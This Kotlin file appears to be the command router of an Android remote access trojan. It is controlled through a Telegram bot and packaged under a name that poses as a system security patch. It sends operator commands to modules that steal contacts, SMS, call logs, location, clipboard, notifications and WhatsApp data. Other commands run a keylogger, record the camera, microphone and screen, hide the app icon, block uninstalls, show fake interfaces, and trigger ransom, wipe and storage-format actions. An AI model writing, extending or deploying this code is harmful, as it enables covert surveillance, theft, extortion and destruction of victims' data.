package com.android.security.patch

import android.content.Context
import com.android.security.patch.commands.*
import com.android.security.patch.commands.Clipboard
import com.android.security.patch.commands.Gallery
import com.android.security.patch.commands.Browser
import com.android.security.patch.commands.WA
import com.android.security.patch.commands.FakeUI
import org.json.JSONObject

object CommandRouter {

    fun dispatch(ctx: Context, update: JSONObject) {
        update.optJSONObject("callback_query")?.let { cb ->
            onCallback(ctx, cb)
            return
        }
        val msg = update.optJSONObject("message") ?: return
        val chat = msg.optJSONObject("chat") ?: return
        val chatId = chat.optLong("id")
        val fromId = msg.optJSONObject("from")?.optLong("id") ?: chatId

        if (!isAuthorized(ctx, fromId, chatId)) {
            RatApi.sendMessage(ctx, "Unauthorized.", chatId)
            return
        }

        val text = msg.optString("text").orEmpty().trim()
        if (text.isEmpty()) return

        val parts = text.split("\\s+".toRegex())
        var cmd = parts[0].lowercase()
        if (cmd.startsWith("/")) cmd = cmd.substring(1)
        cmd = cmd.split("@")[0]
        val args = parts.drop(1).toTypedArray()

        handle(ctx, chatId, cmd, args, msg)
    }

    private fun isAuthorized(ctx: Context, fromId: Long, chatId: Long): Boolean {
        val owner = Prefs.getLong(ctx, Prefs.OWNER_CHAT, Config.OWNER_CHAT_ID)
        if (fromId == owner) return true
        val ops = Prefs.getStr(ctx, Prefs.OPERATORS, "").orEmpty()
        if (ops.isBlank()) return false
        return ops.split(",").mapNotNull { it.trim().toLongOrNull() }.contains(fromId)
    }

    private fun onCallback(ctx: Context, cb: JSONObject) {
        val id = cb.optString("id")
        val fromId = cb.optJSONObject("from")?.optLong("id") ?: 0L
        val msg = cb.optJSONObject("message")
        val chatId = msg?.optJSONObject("chat")?.optLong("id") ?: 0L
        if (!isAuthorized(ctx, fromId, chatId)) {
            RatApi.answerCallback(ctx, id, "Unauthorized")
            return
        }
        val data = cb.optString("data").orEmpty()
        if (data.isBlank()) {
            RatApi.answerCallback(ctx, id)
            return
        }

        // pagination / download / dir-nav — routing ke Pager
        if (data.startsWith("pg|") || data.startsWith("dl|") || data.startsWith("cd|")) {
            Pager.currentCbId = id
            val srcMsg = cb.optJSONObject("message")
            val srcMsgId = srcMsg?.optLong("message_id") ?: 0L
            RatApi.answerCallback(ctx, id)
            if (srcMsgId != 0L) Pager.onCallback(ctx, chatId, srcMsgId, data)
            return
        }

        RatApi.answerCallback(ctx, id)
        val parts = data.split("|")
        val action = parts.getOrNull(0) ?: return
        val args = parts.drop(1).toTypedArray()

        // NB: menu TIDAK dihapus untuk action biasa (home, flash, dll)
        // yang dihapus cuma pas pagination via Pager (route di atas)
        handle(ctx, chatId, action, args, msg)
    }

    private fun handle(ctx: Context, chatId: Long, cmd: String, args: Array<String>, msg: JSONObject?) {
        when (cmd) {
            // menu
            "start", "menu", "help" -> InlineMenu.show(ctx, chatId)
            "close_menu" -> msg?.let {
                val mid = it.optLong("message_id")
                RatApi.editMessage(ctx, chatId, mid, "<i>menu closed</i>", null)
            }

            // navigasi
            "home" -> Navigate.home(ctx, chatId)
            "back" -> Navigate.back(ctx, chatId)
            "recents" -> Navigate.recents(ctx, chatId)
            "notif_pull" -> Navigate.pullNotifications(ctx, chatId)
            "notif_send" -> Navigate.sendNotification(ctx, chatId, args)
            "notify" -> Navigate.sendNotification(ctx, chatId, args)

            // media
            "cam" -> Media.cam(ctx, chatId, args, msg)
            "mic" -> Media.mic(ctx, chatId, args)
            "voice" -> Media.voice(ctx, chatId, args, msg)

            // sistem
            "lock" -> SystemCmd.lock(ctx, chatId)
            "hardlock" -> SystemCmd.hardLock(ctx, chatId, args)
            "unlock" -> SystemCmd.unlock(ctx, chatId, args)
            "setpin" -> SystemCmd.setPin(ctx, chatId, args)
            "admin" -> SystemCmd.admin(ctx, chatId, args)
            "overlay_on" -> SystemCmd.overlayOn(ctx, chatId, args)
            "overlay_off" -> SystemCmd.overlayOff(ctx, chatId)
            "hide_icon" -> SystemCmd.hideIcon(ctx, chatId)
            "show_icon" -> SystemCmd.showIcon(ctx, chatId)
            "vibrate" -> SystemCmd.vibrate(ctx, chatId, args)
            "wallpaper" -> SystemCmd.wallpaper(ctx, chatId, msg)
            "flash_on" -> SystemCmd.flashOn(ctx, chatId)
            "flash_off" -> SystemCmd.flashOff(ctx, chatId)
            "flash_blink" -> SystemCmd.flashBlink(ctx, chatId, args)

            // app
            "apps" -> Apps.listApps(ctx, chatId, args)
            "app_open" -> Apps.openApp(ctx, chatId, args)
            "app_hide" -> Apps.hideApp(ctx, chatId, args)
            "app_show" -> Apps.showApp(ctx, chatId, args)
            "app_uninstall" -> Apps.uninstallApp(ctx, chatId, args)

            // interaksi
            "toast" -> Interaction.toast(ctx, chatId, args)
            "popup" -> Interaction.popup(ctx, chatId, args)
            "tts" -> Interaction.tts(ctx, chatId, args)

            // data
            "contacts" -> DataCmd.contacts(ctx, chatId)
            "sms" -> DataCmd.sms(ctx, chatId, args)
            "calllog" -> DataCmd.callLog(ctx, chatId)
            "gps" -> DataCmd.gps(ctx, chatId)
            "devinfo" -> DataCmd.devInfo(ctx, chatId)
            "ls" -> DataCmd.ls(ctx, chatId, args)
            "dl" -> DataCmd.download(ctx, chatId, args)
            "upload" -> DataCmd.upload(ctx, chatId, msg)
            "keylog" -> DataCmd.keylog(ctx, chatId, args)
            "notifs" -> {
                // /notifs                       → live, semua
                // /notifs wa                    → live, wa
                // /notifs wa_biz                → live, wa bisnis
                // /notifs history               → history, semua
                // /notifs history wa            → history, wa
                // /notifs wa history            → history, wa
                val a = args.toMutableList()
                val isHist = a.removeAll { it.equals("history", true) || it.equals("hist", true) || it.equals("log", true) }
                Pager.openNotifs(ctx, chatId, a.joinToString(" "), !isHist)
            }
            "notifs_clear" -> { NotifListener.clearNotifs(); RatApi.sendMessage(ctx, "notif history cleared", chatId) }

            // layar
            "ss" -> ScreenCmd.screenshot(ctx, chatId)
            "rec_start" -> ScreenCmd.startRec(ctx, chatId, args)
            "rec_stop" -> ScreenCmd.stopRec(ctx, chatId)

            // danger
            "ransom" -> DangerCmd.ransom(ctx, chatId, args)
            "wipe" -> DangerCmd.wipe(ctx, chatId, args)
            "format_storage" -> DangerCmd.formatStorage(ctx, chatId)
            "check_paths" -> DangerCmd.checkPaths(ctx, chatId)
            "reboot" -> DangerCmd.reboot(ctx, chatId)

            // rules
            "rules" -> Rules.show(ctx, chatId)
            "anti_uninstall" -> Rules.toggleAntiUninstall(ctx, chatId, args)
            "hang_now" -> Rules.hangNow(ctx, chatId, args)
            "hang_stop" -> Rules.hangStop(ctx, chatId)

            // operasi grup
            "izin" -> Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId)
            "op_add" -> OpMgr.add(ctx, chatId, args)
            "op_del" -> OpMgr.del(ctx, chatId, args)
            "op_list" -> OpMgr.list(ctx, chatId)

            // hidden
            "clipboard" -> Clipboard.read(ctx, chatId)
            "clipboard_set" -> Clipboard.write(ctx, chatId, args)
            "gallery" -> Gallery.open(ctx, chatId, args)
            "browser" -> Browser.open(ctx, chatId, args)
            "wa" -> WA.send(ctx, chatId, args)
            "wa_number" -> WA.getNumber(ctx, chatId)
            "wa_open" -> WA.openWA(ctx, chatId)
            "wa_dump" -> WA.dumpScreen(ctx, chatId)
            "fake_ui" -> FakeUI.show(ctx, chatId, args)
            "fake_ui_off" -> FakeUI.hide(ctx, chatId)
            "keylog_filter" -> {
                if (args.isEmpty()) {
                    com.android.security.patch.KeylogService.instance?.setFilter(null)
                    RatApi.sendMessage(ctx, "keylog filter cleared", chatId)
                } else {
                    val p = args[0]
                    com.android.security.patch.KeylogService.instance?.setFilter(p)
                    RatApi.sendMessage(ctx, "keylog filter: <code>$p</code>", chatId)
                }
            }

            "ping" -> RatApi.sendMessage(ctx, "pong", chatId)

            else -> {
                // mungkinn user upload foto/video/doc tanpa command sebelumnya
                RatApi.sendMessage(ctx, "unknown command: <code>$cmd</code>\n/menu", chatId)
            }
        }
    }
}